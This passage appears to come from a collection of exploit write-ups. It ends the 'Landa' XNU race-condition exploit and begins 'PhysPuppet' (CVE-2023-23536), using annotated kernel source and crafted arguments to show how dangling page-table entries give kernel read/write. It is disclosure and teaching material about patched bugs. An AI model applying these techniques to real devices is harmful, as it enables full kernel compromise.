page-aligned, so `vm_map_copy_overwrite()` does not split the VMC with a "head" or "tail", and only
calls `vm_map_copy_overwrite_nested()` once. Just like for P0 issue 2361, that function checks that
all destination VMEs are overwriteable, which also includes making sure that the VMEs are not marked
as "in transition". At that point, `mlock()` is still stuck on `dst_vme_1->user_wired_count` being
equal to `MAX_WIRE_COUNT`, so the destination range (i.e. `dst_vme_1` to `dst_vme_3`) is guaranteed
not to be in transition. Therefore, `vm_map_copy_overwrite_nested()` proceeds and calls
`vm_map_copy_overwrite_aligned()` while holding the map lock. There will be three iterations of the
top-level while loop in `vm_map_copy_overwrite_aligned()`:

- In the 1st iteration, `copy_entry == copy_vme_1`, `entry == dst_vme_1`, and `object == dst_vmo_1`.
- In the 2nd iteration, `copy_entry == copy_vme_2`, `entry == dst_vme_2`, and `object == dst_vmo_2`.
- In the 3rd iteration, `copy_entry == copy_vme_3`, `entry == dst_vme_3`, and `object == dst_vmo_3`.

Also, please note that each pair of `copy_entry` and `entry` has been crafted to have the same size,
such that no clipping occurs. Finally, we get to the if-else statement which decides whether we take
the "fast path" or the "slow path", as shown in the snippet below:

```c
// Location: osfmk/vm/vm_map.c

static kern_return_t
vm_map_copy_overwrite_aligned(
    vm_map_t        dst_map,
    vm_map_entry_t  tmp_entry,
    vm_map_copy_t   copy,
    vm_map_offset_t start,
    __unused pmap_t pmap)
{
    vm_object_t     object;
    vm_map_entry_t  copy_entry;
    vm_map_size_t   copy_size;
    vm_map_size_t   size;
    vm_map_entry_t  entry;

    while ((copy_entry = vm_map_copy_first_entry(copy)) != vm_map_copy_to_entry(copy)) {
        ...

        // this if-else statement decides whether we take the fast path or the slow path
        if (((!entry->is_shared) &&
             ((object == VM_OBJECT_NULL) || (object->internal && !object->true_share))) ||
            (entry->needs_copy)) {
            // fast path branch
            ...
        } else {
            // slow path branch
            ...
        }
    }

    return KERN_SUCCESS;
}
```

During the first iteration, `dst_vme_1` and `dst_vmo_1` satisfy all the conditions to take the fast
path. The snippet below shows what happens inside the fast path branch during the first iteration:

```c
{
    // NOTE: this is inside the fast path branch
    vm_object_t         old_object = VME_OBJECT(entry); // old_object := dst_vmo_1
    vm_object_offset_t  old_offset = VME_OFFSET(entry); // old_offset := 0
    vm_object_offset_t  offset;

    if ((old_object == VME_OBJECT(copy_entry)) &&
        (old_offset == VME_OFFSET(copy_entry))) { // branch not taken because of different objects
        ...
    }

    ...

    if ((dst_map->pmap != kernel_pmap) &&
        (VME_ALIAS(entry) >= VM_MEMORY_MALLOC) &&
        (VME_ALIAS(entry) <= VM_MEMORY_MALLOC_MEDIUM)) { // branch not taken because alias is 0
        ...
    }

    if (old_object != VM_OBJECT_NULL) { // branch taken
        if (entry->is_sub_map) { // branch not taken because dst_vme_1->is_sub_map == FALSE
            ...
        } else {
            if (dst_map->mapped_in_other_pmaps) { // branch not taken
                ...
            } else {
                // PTEs in the VA range of dst_vme_1 are removed here
                pmap_remove_options(
                    dst_map->pmap,
                    (addr64_t)(entry->vme_start),
                    (addr64_t)(entry->vme_end),
                    PMAP_OPTIONS_REMOVE);
            }
            // dst_vmo_1 is deallocated and reaped here
            vm_object_deallocate(old_object);
        }
    }

    ...

    VME_OBJECT_SET(entry, VME_OBJECT(copy_entry), false, 0); // VME_OBJECT(dst_vme_1) := copy_vmo_1
    object = VME_OBJECT(entry);                              // object := copy_vmo_1
    entry->needs_copy = copy_entry->needs_copy;              // dst_vme_1->needs_copy := FALSE
    entry->wired_count = 0;                                  // dst_vme_1->wired_count := 0
    entry->user_wired_count = 0;                             // dst_vme_1->user_wired_count := 0
    offset = VME_OFFSET(copy_entry);                         // offset := 0
    VME_OFFSET_SET(entry, offset);                           // VME_OFFSET(dst_vme_1) := 0

    // copy_vme_1 is unlinked and deallocated here
    vm_map_copy_entry_unlink(copy, copy_entry);
    vm_map_copy_entry_dispose(copy_entry);

    start = tmp_entry->vme_end; // start := B+1P
    tmp_entry = tmp_entry->vme_next; // tmp_entry := dst_vme_2
}
```

In short, `dst_vmo_1` is deallocated and replaced with `copy_vmo_1`. The PTEs in the VA range of
`dst_vme_1` are also removed, although that is not relevant for the exploit. More importantly,
`dst_vme_1->wired_count` and `dst_vme_1->user_wired_count` are reset to 0. Note that we still hold
the map lock at this point, but as soon as we release it, `mlock()` will no longer be stuck in the
spinner thread.

Next, we go back to the top of the while loop for the second iteration. However, this time we take
the slow path because `dst_vme_2->is_shared` is set to `TRUE`. The snippet below shows what happens
inside the slow path branch during the second iteration:

```c
{
    // NOTE: this is inside the slow path branch
    vm_map_version_t    version;
    vm_object_t         dst_object;
    vm_object_offset_t  dst_offset;
    kern_return_t       r;

slow_copy:
    if (entry->needs_copy) { // branch not taken because dst_vme_2->needs_copy == FALSE
        ...
    }

    dst_object = VME_OBJECT(entry); // dst_object := dst_vmo_2
    dst_offset = VME_OFFSET(entry); // dst_offset := 0

    if (dst_object == VM_OBJECT_NULL) { // branch not taken
        ...
    }

    vm_object_reference(dst_object); // dst_vmo_2->ref_count++
    version.main_timestamp = dst_map->timestamp + 1;
    vm_map_unlock(dst_map); // map lock is dropped here

    copy_size = size; // copy_size := 1P

    r = vm_fault_copy(
        VME_OBJECT(copy_entry),
        VME_OFFSET(copy_entry),
        &copy_size,
        dst_object,
        dst_offset,
        dst_map,
        &version,
        THREAD_UNINT);

    vm_object_deallocate(dst_object); // dst_vmo_2->ref_count--

    if (r != KERN_SUCCESS) { // branch not taken because vm_fault_copy() returns KERN_SUCCESS
        ...
    }

    if (copy_size != 0) { // branch taken because copy_size == 1P
        vm_map_copy_clip_end(copy, copy_entry, copy_entry->vme_start + copy_size);
        vm_map_copy_entry_unlink(copy, copy_entry);
        vm_object_deallocate(VME_OBJECT(copy_entry)); // copy_vmo_2 is deallocated here
        vm_map_copy_entry_dispose(copy_entry); // copy_vme_2 is deallocated here
    }

    start += copy_size; // start := B+2P
    vm_map_lock(dst_map); // map lock taken back here

    // NOTE: the spinner thread should always take the map lock before we take it back,
    // but the possible outcomes of the race condition will be discussed later
    if (version.main_timestamp == dst_map->timestamp && copy_size != 0) { // branch not taken
        ...
    } else {
        if (!vm_map_lookup_entry(dst_map, start, &tmp_entry)) { // tmp_entry := dst_vme_3
            ...
        }
        ...
    }
}
```

In short, we take a temporary reference on `dst_vmo_2`, then we drop the map lock before calling
`vm_fault_copy()`, which will do a physical copy of the page from `copy_vmo_2` into `dst_vmo_2`.
Before we proceed with what happens after the map lock is released, here is an illustration of the
relevant kernel state after substep 2B:

![landa-figure4.png](figures/landa-figure4.png)

As mentioned in a comment in the snippet above, the spinner thread should always take the map lock
before `vm_map_copy_overwrite_aligned()` takes it back when `vm_fault_copy()` returns. Therefore,
let's move our attention to the spinner thread. Here, `mlock()` calls `vm_map_wire_kernel()`, which
in turn calls `vm_map_wire_nested()`. This function takes the map lock and performs a lookup for
address B, which returns `dst_vme_1`. Then, there will be three iterations of the top-level while
loop in `vm_map_wire_nested()`, one for each of `dst_vme_1`, `dst_vme_2` and `dst_vme_3`.

During the first iteration, `entry` is set to `dst_vme_1`, which has a reference to `copy_vmo_1`.
Since `copy_vmo_1` has a `copy_strategy` of `MEMORY_OBJECT_COPY_SYMMETRIC`, `vm_map_wire_nested()`
will call `VME_OBJECT_SHADOW()` on `dst_vme_1`, but the shadow creation will be skipped. However,
`copy_vmo_1->copy_strategy` is set to `MEMORY_OBJECT_COPY_DELAY` and `copy_vmo_1->true_share` is set
to `TRUE`. Please note that none of this is really relevant for the exploit, I only mention it in
case you are following along with the XNU source code. Next, `vm_map_wire_nested()` calls
`add_wire_counts()`. This time around, `dst_vme_1->wired_count` and `dst_vme_1->user_wired_count`
have been reset to 0, so `add_wire_counts()` will bump each of them to 1 instead of returning
`KERN_FAILURE`. Then, `dst_vme_1->in_transition` is set to `TRUE`, the map is unlocked, and
`vm_fault_wire()` is called, which will wire the single page in `copy_vmo_1`. Once again,
`vm_map_wire_nested()` must take back the map lock before `vm_map_copy_overwrite_aligned()` takes
it back when `vm_fault_copy()` returns. However, wiring a single page is much faster than physically
copying a page, so that race is also easy to win. One important thing to note is that even if we
lose the race, the lookup after the timestamp check failure is guaranteed to still return
`dst_vme_1` such that we are guaranteed not to trigger the "vm_map_wire: re-lookup failed" panic.
Instead, we could simply restart the exploit. But in practice, we always win this race so let's
continue. After the map lock is retaken, `dst_vme_1->in_transition` is set back to `FALSE`, and we
move on to the next VME.

During the second iteration, `entry` is set to `dst_vme_2`, which has a reference to `dst_vmo_2`.
However, `dst_vme_2->wired_count` is already set to 1, so `add_wire_counts()` simply bumps
`dst_vme_2->user_wired_count` to 2, and we immediately move on to the next VME without dropping the
map lock.

During the third iteration, `entry` is set to `dst_vme_3`, which has a reference to `dst_vmo_3`.
Unlike the first iteration, `dst_vmo_3` has a `copy_strategy` of `MEMORY_OBJECT_COPY_NONE`, so no
shadow creation is attempted. Next, `vm_map_wire_nested()` calls `add_wire_counts()`, which bumps
both `dst_vme_3->wired_count` and `dst_vme_3->user_wired_count` to 1. Then,
`dst_vme_3->in_transition` is set to `TRUE`, the map is unlocked, and `vm_fault_wire()` is called,
which will wire the X pages in `dst_vmo_3`. Crucially, `vm_fault_wire()` receives a shallow bitwise
copy of `dst_vme_3`, which will always point to `dst_vmo_3` even if `VME_OBJECT(dst_vme_3)` is
modified later while the map is unlocked. Technically, `dst_vme_3` is marked as "in transition", so
this should never happen, but this is precisely what our race condition exploits. At this point,
`vm_fault_wire()` will call `vm_fault_wire_fast()` for each of the X pages of `dst_vmo_3`. However,
this time, we expect `vm_fault_copy()` to finish physically copying the single page of `dst_vmo_2`
before `vm_fault_wire()` finishes wiring all X pages of `dst_vmo_3`, such that
`vm_map_copy_overwrite_aligned()` takes back the map lock here. Please note that I will discuss the
possible outcomes of this race at the very end of step 2, but first let's assume this is what
happens. Before we proceed, here is an illustration of the relevant kernel state after substep 2C:

![landa-figure5.png](figures/landa-figure5.png)

Back in the main thread, as shown in the snippet above for the slow path after `vm_fault_copy()`
returns, the extra reference on `dst_vmo_2` is released, then `copy_vme_2` and `copy_vmo_2` are
deallocated, and finally the map lock is taken again. The map timestamp has changed so a lookup
is performed, which returns `dst_vme_3`, and we move on to the third and final iteration of the
while loop in `vm_map_copy_overwrite_aligned()`. This time, `dst_vme_3` and `dst_vmo_3` satisfy
all the conditions to take the fast path. The snippet below shows what happens inside the fast
path branch during the third iteration:

```c
{
    // NOTE: this is inside the fast path branch
    vm_object_t         old_object = VME_OBJECT(entry); // old_object := dst_vmo_3
    vm_object_offset_t  old_offset = VME_OFFSET(entry); // old_offset := 0
    vm_object_offset_t  offset;

    if ((old_object == VME_OBJECT(copy_entry)) &&
        (old_offset == VME_OFFSET(copy_entry))) { // branch not taken because of different objects
        ...
    }

    ...

    if ((dst_map->pmap != kernel_pmap) &&
        (VME_ALIAS(entry) >= VM_MEMORY_MALLOC) &&
        (VME_ALIAS(entry) <= VM_MEMORY_MALLOC_MEDIUM)) { // branch not taken because alias is 0
        ...
    }

    if (old_object != VM_OBJECT_NULL) { // branch taken
        if (entry->is_sub_map) { // branch not taken because dst_vme_3->is_sub_map == FALSE
            ...
        } else {
            if (dst_map->mapped_in_other_pmaps) { // branch not taken
                ...
            } else {
                // PTEs in the VA range of dst_vme_3 are removed here
                pmap_remove_options(
                    dst_map->pmap,
                    (addr64_t)(entry->vme_start),
                    (addr64_t)(entry->vme_end),
                    PMAP_OPTIONS_REMOVE);
            }
            // dst_vmo_3->ref_count drops to 1
            vm_object_deallocate(old_object);
        }
    }

    ...

    VME_OBJECT_SET(entry, VME_OBJECT(copy_entry), false, 0); // VME_OBJECT(dst_vme_3) := copy_vmo_3
    object = VME_OBJECT(entry);                              // object := copy_vmo_3
    entry->needs_copy = copy_entry->needs_copy;              // dst_vme_3->needs_copy := FALSE
    entry->wired_count = 0;                                  // dst_vme_3->wired_count := 0
    entry->user_wired_count = 0;                             // dst_vme_3->user_wired_count := 0
    offset = VME_OFFSET(copy_entry);                         // offset := 0
    VME_OFFSET_SET(entry, offset);                           // VME_OFFSET(dst_vme_3) := 0

    // copy_vme_3 is unlinked and deallocated here
    vm_map_copy_entry_unlink(copy, copy_entry);
    vm_map_copy_entry_dispose(copy_entry);

    start = tmp_entry->vme_end; // start := B+(X+2)P
    tmp_entry = tmp_entry->vme_next; // tmp_entry := dst_vme_4 but we exit the loop here
}
```

In short, the PTEs in the VA range of `dst_vme_3` are removed, which is relevant because those are
the PTEs from which we want to obtain a PUAF primitive. Next, `dst_vmo_3->ref_count` drops to 1,
and `VME_OBJECT(dst_vme_3)` is updated to `copy_vmo_3` instead of `dst_vmo_3`. After this, the VMC
is empty so `vm_map_copy_overwrite_aligned()` is done, and `vm_copy()` returns `KERN_SUCCESS`.

Meanwhile, back in the spinner thread, `vm_fault_wire()` will continue to wire the X pages of
`dst_vmo_3`, which will re-enter the PTEs in the VA range of `dst_vme_3` with the physical address
of those pages, with both read and write permissions. After this, `vm_map_wire_nested()` is done,
and `mlock()` returns 0. Here is an illustration of the relevant kernel state after substep 2D,
which is the final substep of step 2:

![landa-figure6.png](figures/landa-figure6.png)

As promised, I will now discuss the possible outcomes of the various race conditions. Please note
that until the point where `vm_map_copy_overwrite_aligned()` drops the map lock, before it calls
`vm_fault_copy()` during the second iteration, the exploit is fully deterministic. Now, let's
consider three different scenarios:

1. `vm_map_copy_overwrite_aligned()` takes back the map lock before `vm_map_wire_nested()` even has
   a chance to take it for the first time in the spinner thread, which would be extremely unlikely.
   In that case, `vm_map_copy_overwrite_aligned()` would run to completion with the map lock.
   Therefore, the reference of `dst_vme_3` to `dst_vmo_3` would be replaced by `copy_vmo_3` before
   the map lock is released for a second time. Thus, the shallow bitwise copy of `dst_vme_3`
   eventually received by `vm_fault_wire()` would also point to `copy_vmo_3`. As a consequence, the
   pages of `copy_vmo_3` would be wired instead of the pages of `dst_vmo_3`. The PUAF exploit would
   fail, but safely so, and could be retried as many times as necessary.
2. `vm_map_wire_nested()` takes the map lock, marks `dst_vme_1` as in transition, then drops the map
   lock before it calls `vm_fault_wire()`. However, `vm_map_copy_overwrite_aligned()` takes it back
   before `vm_map_wire_nested()` can manage to do the same. This is more likely than the first
   scenario, but still unlikely because physically copying 1 page in `vm_fault_copy()` is much
   slower than wiring 1 PTE in `vm_fault_wire_fast()`. Nonetheless, if it did happen, then the
   outcome would be identical to the first scenario for the same reason: the reference of
   `dst_vme_3` to `dst_vmo_3` would already be replaced by `copy_vmo_3` by the time
   `vm_map_wire_nested()` makes a shallow bitwise copy of it.
3. On the opposite end of the spectrum, `vm_map_wire_nested()` manages to run to completion before
   `vm_map_copy_overwrite_aligned()` takes back the map lock. This means that `vm_fault_wire_fast()`
   would have been executed (X+1) times before the physical copy of a single page in
   `vm_fault_copy()` is finished. For large values of X, this is also unlikely as each individual
   call to `vm_fault_wire_fast()` will need to take both the object lock and the page queue lock,
   amongst other things. Nonetheless, if it did happen, then we would have successfully wired X
   pages from `dst_vmo_3` in the VA range of `dst_vme_3`, but all those PTEs would be removed later
   by `vm_map_copy_overwrite_aligned()` when it finally takes back the map lock and replaces the
   reference to `dst_vmo_3` with `copy_vmo_3`. Once again, the PUAF exploit would fail safely, and
   could be retried as needed.

Of course, there is yet another possible scenario. At some point, the main thread is busy executing
`vm_fault_copy()` and the spinner thread is busy executing `vm_fault_wire()`, and neither of them
holds the map lock. In that case, it is possible for `vm_fault_wire()` to wire a certain number of
PTEs at the beginning of the VA range of `dst_vme_3`, then for `vm_fault_copy()` to return and
`vm_map_copy_overwrite_aligned()` to call `pmap_remove_options()` for `dst_vme_3`, which would
remove all of its PTEs. That said, after that, `vm_fault_wire()` can continue wiring the remaining
pages of `dst_vmo_3`, which would re-enter the remaining PTEs in that VA range. Ultimately, we would
end up with a PUAF primitive on a fraction of the X pages. And that does happen sometimes! As it
stands, according to my tests when X is set to 2048, the exploit obtains a PUAF primitive on all
2048 pages for the vast majority of the time. However, sometimes, my tests indicate that the very
first PTE in the range of `dst_vme_3` is cleared, and therefore the exploit obtains a PUAF primitive
on a meager 2047 pages. Those are the only two outcomes I have observed with the current state of
the exploit. In the past, before I tweaked some things, I had seen up to 4 PTEs getting cleared.
Anyway, because this PUAF exploit is safe, it can be repeated if we are unable to obtain the KRKW
primitive from the PUAF primitive the first time around.

#### STEP 3:

This step simply deallocates `dst_vme_4`, which has the only remaining reference to `dst_vmo_3`.
Therefore, this triggers `vm_object_reap()` for `dst_vmo_3`, which will put all of its pages back on
the free list without calling `pmap_disconnect()`. That said, the PTEs in the VA range of
`dst_vme_3` still point to (up to) X of those pages with both read and write permissions. Here is an
illustration of the relevant kernel state after step 3:

![landa-figure7.png](figures/landa-figure7.png)

---

## Part B: From PUAF to KRKW

This part of the exploit is shared across all PUAF exploits, so please check the write-up about
[exploiting PUAFs](exploiting-puafs.md) for more details.

---

## Part C: From KRKW to Cleanup

This exploit does not corrupt the kernel state such that it needs to be cleaned up post-KRKW in
order to prevent a kernel panic.

```

`writeups/physpuppet.md`:

```md
# PhysPuppet

This was the first vulnerability I found leading to dangling PTEs. In my original exploit, as
explained in this [write-up](exploiting-puafs.md), I was inspired by [SockPuppet][1] to reallocate
socket-related objects inside the physical pages. I am grateful to Ned Williamson for the
inspiration, hence the name!

[1]: https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html

---

## Abbreviations

- KRKW: kernel read/write
- PUAF: physical use-after-free
- VMC: `vm_map_copy` structure
- VME: `vm_map_entry` structure
- VMO: `vm_object` structure
- VMP: `vm_page` structure
- VMNE: `vm_named_entry` structure

---

## Table of Contents

- [Introduction](#introduction)
- [Part A: From Vulnerability to PUAF](#part-a-from-vulnerability-to-puaf)
- [Part B: From PUAF to KRKW](#part-b-from-puaf-to-krkw)
- [Part C: From KRKW to Cleanup](#part-c-from-krkw-to-cleanup)

---

## Introduction

This write-up presents an exploit for a vulnerability in the XNU kernel:

- Assigned [CVE-2023-23536][2].
- Fixed in iOS 16.4 and macOS 13.3.
- Reachable from the App Sandbox but not the WebContent sandbox.

The exploit has been successfully tested on:

- iOS 16.1 (iPhone 14 Pro Max)
- macOS 13.0 (MacBook Air M2 2022)

All code snippets shown below are from [xnu-8792.41.9][3].

[2]: https://support.apple.com/en-us/HT213676
[3]: https://github.com/apple-oss-distributions/xnu/tree/xnu-8792.41.9

---

## Part A: From Vulnerability to PUAF

This part of the exploit is made up of 6 steps, which are labeled in the function
`physpuppet_run()`, located in [physpuppet.h](../kfd/libkfd/puaf/physpuppet.h). Each step will be
described in detail below, with figures illustrating the relevant kernel state after each step. Note
that the green boxes represent VMEs, the yellow boxes represent VMOs, the purple boxes represent
VMCs, the blue boxes represent VMNEs, the orange boxes represent VMPs, and the red text highlights
the difference compared to the previous figure. Also, please note that P denotes the page size
(i.e. 16384 bytes). Lastly, before reading the description of each step, please check the
corresponding code in the function `physpuppet_run()`, as it won't be repeated here.

#### STEP 1:

The MIG routine `mach_memory_object_memory_entry_64()` is a pretty simple routine that allows us to
create a named entry with an unaligned size. Note that the returned named entry (`vmne1`) has an
unaligned size, but its internal VME (`vme1`) does have page-aligned start and end addresses. Here
is the code path taken by the MIG routine:

```c
// Location: osfmk/vm/vm_user.c

kern_return_t
mach_memory_object_memory_entry_64(
    host_t                  host,           // host := mach_host_self()
    boolean_t               internal,       // internal := TRUE
    vm_object_offset_t      size,           // size := 2P+1
    vm_prot_t               permission,     // permission := VM_PROT_DEFAULT
    memory_object_t         pager,          // pager := MEMORY_OBJECT_NULL
    ipc_port_t              *entry_handle)
{
    unsigned int            access;
    vm_named_entry_t        user_entry;
    ipc_port_t              user_handle;
    vm_object_t             object;

    if (host == HOST_NULL) { // branch not taken
        ...
    }

    if (pager == MEMORY_OBJECT_NULL && internal) { // branch taken
        /*
         * Note:
         * - vm_object_allocate() rounds up object->vo_size to 3P.
         * - "object" refers to vmo1 in the figures.
         */
        object = vm_object_allocate(size);
        if (object->copy_strategy == MEMORY_OBJECT_COPY_SYMMETRIC) { // branch taken
            object->copy_strategy = MEMORY_OBJECT_COPY_DELAY;
        }
    } else { // branch not taken
        ...
    }
    if (object == VM_OBJECT_NULL) { // branch not taken
        ...
    }

    /*
     * Note:
     * - "user_entry" refers to vmne1 in the figures.
     */
    user_entry = mach_memory_entry_allocate(&user_handle);
    user_entry->size = size;                            // vmne1->size := 2P+1
    user_entry->offset = 0;                             // vmne1->offset := 0P
    user_entry->protection = permission & VM_PROT_ALL;  // vmne1->protection := VM_PROT_DEFAULT
    access = GET_MAP_MEM(permission);
    SET_MAP_MEM(access, user_entry->protection);
    user_entry->is_sub_map = FALSE;

    /*
     * Note:
     * - vm_named_entry_associate_vm_object() will allocate vmc1 and vme1 in the figures.
     * - VME_OBJECT(vme1) will be set to vmo1 and VME_OFFSET(vme1) will be set to 0P.
     * - vme1 will be linked in with vmc1.
     * - vmne1->backing.copy will be set to vmc1.
     */
    vm_named_entry_associate_vm_object(user_entry, object, 0, size,
        (user_entry->protection & VM_PROT_ALL));
    user_entry->internal = object->internal;
    assert(object->internal == internal);
    if (VM_OBJECT_OWNER(object) != TASK_NULL) { // branch not taken
        ...
    }

    *entry_handle = user_handle;
    return KERN_SUCCESS;
}
```

Here is an illustration of the relevant kernel state after step 1:

![physpuppet-figure1.png](figures/physpuppet-figure1.png)

#### STEP 2:

In this step, we call the `vm_map()` routine to make a mapping of the named entry created in step 1.
However, the arguments are crafted to trigger some weird edge cases that allow us to end up calling
`vm_map_enter()` with an unaligned size of 1P + 1, which will create and insert a new VME (`vme2`)
into our VM map at a random address A, but with an end address of A + 1P + 1. Here is the detailed
code path taken by `vm_map_enter_mem_object_helper()`:

```c
// Location: osfmk/vm/vm_map.c

static kern_return_t
vm_map_enter_mem_object_helper(
    vm_map_t                target_map,         // target_map := current_map()
    vm_map_offset_t         *address,           // *address := 0
    vm_map_size_t           initial_size,       // initial_size := ~0ULL
    vm_map_offset_t         mask,               // mask := 0
    int                     flags,              // flags := (VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR)
    vm_map_kernel_flags_t   vmk_flags,          // ...
    vm_tag_t                tag,                // tag := 0
    ipc_port_t              port,               // port := (ipc_port for vmne1)
    vm_object_offset_t      offset,             // offset := 1P
    boolean_t               copy,               // copy := FALSE
    vm_prot_t               cur_protection,     // cur_protection := VM_PROT_DEFAULT
    vm_prot_t               max_protection,     // max_protection := VM_PROT_DEFAULT
    vm_inherit_t            inheritance,        // inheritance := VM_INHERIT_DEFAULT
    upl_page_list_ptr_t     page_list,          // page_list := NULL
    unsigned int            page_list_count)    // page_list_count := 0
{
    vm_map_address_t        map_addr;
    vm_map_size_t           map_size;
    vm_object_t             object;
    vm_object_size_t        size;
    kern_return_t           result;
    boolean_t               mask_cur_protection, mask_max_protection;
    boolean_t               kernel_prefault, try_prefault = (page_list_count != 0);
    vm_map_offset_t         offset_in_mapping = 0;
#if __arm64__
    boolean_t               fourk = vmk_flags.vmkf_fourk; /* fourk := FALSE */
#endif

    if (VM_MAP_PAGE_SHIFT(target_map) < PAGE_SHIFT) { // branch not taken
        ...
    }

    mask_cur_protection = cur_protection & VM_PROT_IS_MASK; // mask_cur_protection := 0
    mask_max_protection = max_protection & VM_PROT_IS_MASK; // mask_max_protection := 0
    cur_protection &= ~VM_PROT_IS_MASK; // cur_protection := VM_PROT_DEFAULT
    max_protection &= ~VM_PROT_IS_MASK; // max_protection := VM_PROT_DEFAULT

    if ((target_map == VM_MAP_NULL) ||
        (cur_protection & ~(VM_PROT_ALL | VM_PROT_ALLEXEC)) ||
        (max_protection & ~(VM_PROT_ALL | VM_PROT_ALLEXEC)) ||
        (inheritance > VM_INHERIT_LAST_VALID) ||
        (try_prefault && (copy || !page_list)) ||
        initial_size == 0) { // branch not taken
        ...
    }

#if __arm64__
    if (cur_protection & VM_PROT_EXECUTE) { // branch not taken
        ...
    }

    if (fourk && VM_MAP_PAGE_SHIFT(target_map) < PAGE_SHIFT) { // branch not taken
        ...
    }
    if (fourk) { // branch not taken
        ...
    } else
#endif
    {
        map_addr = vm_map_trunc_page(*address,
            VM_MAP_PAGE_MASK(target_map)); // map_addr := 0
        map_size = vm_map_round_page(initial_size,
            VM_MAP_PAGE_MASK(target_map)); // map_size := 0
    }
    size = vm_object_round_page(initial_size); // size := 0

    /*
     * Note:
     * - both "map_size" and "size" have been set to 0 because of an integer overflow.
     */

    if (!IP_VALID(port)) { // branch not taken
        ...
    } else if (ip_kotype(port) == IKOT_NAMED_ENTRY) { // branch taken
        vm_named_entry_t        named_entry;
        vm_object_offset_t      data_offset;

        named_entry = mach_memory_entry_from_port(port); // named_entry := vmne1

        if (flags & (VM_FLAGS_RETURN_DATA_ADDR |
            VM_FLAGS_RETURN_4K_DATA_ADDR)) { // branch not taken
            ...
        } else { // branch taken
            data_offset = 0;
        }

        if (size == 0) { // branch taken
            //      1P >= 2P+1
            if (offset >= named_entry->size) { // branch not taken
                ...
            }
            size = named_entry->size - offset; // size := (2P+1)-(1P) = 1P+1
        }
        if (mask_max_protection) { // branch not taken
            ...
        }
        if (mask_cur_protection) { // branch not taken
            ...
        }
        if ((named_entry->protection & max_protection) !=
            max_protection) { // branch not taken
            ...
        }
        if ((named_entry->protection & cur_protection) !=
            cur_protection) { // branch not taken
            ...
        }

        //      1P + 1P+1 < 1P
        if (offset + size < offset) { // branch not taken
            ...
        }
        //               2P+1 < (1P     + 0xffffffffffffffff)
        if (named_entry->size < (offset + initial_size)) { // branch not taken
            ...
        }

        if (named_entry->is_copy) { // branch not taken
            ...
        }

        offset = offset + named_entry->offset; // offset := 1P + 0P = 1P

        /*
         * Note:
         * - "map_size" is set to 1P+1 here, which is what we will pass to vm_map_enter().
         */
        if (!VM_MAP_PAGE_ALIGNED(size,
            VM_MAP_PAGE_MASK(target_map))) { // branch taken
            map_size = size; // map_size := 1P+1
        }

        named_entry_lock(named_entry);
        if (named_entry->is_sub_map) { // branch not taken
            ...
        } else if (named_entry->is_copy) { // branch not taken
            ...
        }

        if (named_entry->is_object) { // branch taken
            ...

            object = vm_named_entry_to_vm_object(named_entry); // object := vmo1
            assert(object != VM_OBJECT_NULL);
            vm_object_lock(object);
            named_entry_unlock(named_entry);

            vm_object_reference_locked(object); // vmo1->ref_count := 2

            ...

            vm_object_unlock(object);
        } else { // branch not taken
            ...
        }
    } else if (ip_kotype(port) == IKOT_MEMORY_OBJECT) { // branch not taken
        ...
    } else { // branch not taken
        ...
    }

    if (object != VM_OBJECT_NULL &&
        object->named && // object->named == FALSE
        object->pager != MEMORY_OBJECT_NULL &&
        object->copy_strategy != MEMORY_OBJECT_COPY_NONE) { // branch not taken
        ...
    }

    if (copy) { // branch not taken because copy == FALSE
        ...
    }

    // kernel_prefault := FALSE
    kernel_prefault = (try_prefault && vm_kernel_map_is_kernel(target_map));
    vmk_flags.vmkf_keep_map_locked = (try_prefault && !kernel_prefault);

#if __arm64__
    if (fourk) { // branch not taken
        ...
    } else
#endif
    {
        /*
         * Note:
         * - We end up calling vm_map_enter() with map_size equal to 1P + 1.
         */
        result = vm_map_enter(
            target_map,             // current_map()
            &map_addr,              // 0
            map_size,               // 1P+1
            (vm_map_offset_t)mask,  // 0
            flags,                  // (VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR)
            vmk_flags,              // ...
            tag,                    // 0
            object,                 // vmo1
            offset,                 // 1P
            copy,                   // FALSE
            cur_protection,         // VM_PROT_DEFAULT
            max_protection,         // VM_PROT_DEFAULT
            inheritance);           // VM_INHERIT_DEFAULT
    }
    if (result != KERN_SUCCESS) { // branch not taken because result == KERN_SUCCESS
        ...
    }


    if (result == KERN_SUCCESS && try_prefault) { // branch not taken because try_prefault == FALSE
        ...
    }

    if (flags & (VM_FLAGS_RETURN_DATA_ADDR |
        VM_FLAGS_RETURN_4K_DATA_ADDR)) { // branch not taken
        ...
    } else { // branch taken
        *address = map_addr; // *address := A
    }
    return result;
}
```

Here is an illustration of the relevant kernel state after step 2:

![physpuppet-figure2.png](figures/physpuppet-figure2.png)

#### STEP 3:

After step 2, we have an unaligned VME (`vme2`) linked in our VM map. In step 3, we simply fault in
the 2 pages covered by `vme2`. Note that even if a fault occurs at address A + 1P + PAGE_MASK,
`vm_fault_internal()` truncates the fault address to A + 1P, such that the lookup performed in
`vm_map_lookup_and_lock_object()` still successfully returns `vme2`. Indeed, the lookup routine will
eventually end up in `vm_map_store_lookup_entry_rb()`. Since A + 1P is greater than or equal to
`vme2->vme_start` (i.e. A) and strictly smaller than `vme2->vme_end` (i.e. A + 1P + 1), it returns
`TRUE` with `vme2` as the `vm_entry` out parameter. Note that `VME_OFFSET(vme2)` is equal to 1P,
such that the `offset` out parameter of `vm_map_lookup_and_lock_object()` will be 1P during the
first fault and 2P during the second fault. Next, `vm_fault_internal()` calls `vm_page_lookup()`,
which will fail to find the corresponding page in `vmo1`. Therefore, a page must be grabbed from the
free list and zero-filled. During the first fault, `vmp1` is inserted into `vmo1` at an offset of
1P, and then `VM_PAGE_GET_PHYS_PAGE(vmp1)` is inserted into the PTE for virtual address A with both
read and write permissions. During the second fault, `vmp2` is inserted into `vmo1` at an offset of
2P, and then `VM_PAGE_GET_PHYS_PAGE(vmp2)` is inserted into the PTE for virtual address A + 1P, once
again with both read and write permissions.

Here is an illustration of the relevant kernel state after step 3:

![physpuppet-figure3.png](figures/physpuppet-figure3.png)

#### STEP 4:

In this step, we simply call `vm_deallocate()` to unmap the virtual address range covered by `vme2`,
which is done by `vm_map_delete()`. Here is the detailed code path of that function:

```c
// Location: osfmk/vm/vm_map.c

static kmem_return_t
vm_map_delete(
    vm_map_t                map,        // map := current_map()
    vm_map_offset_t         start,      // start := A
    vm_map_offset_t         end,        // end := A+2P
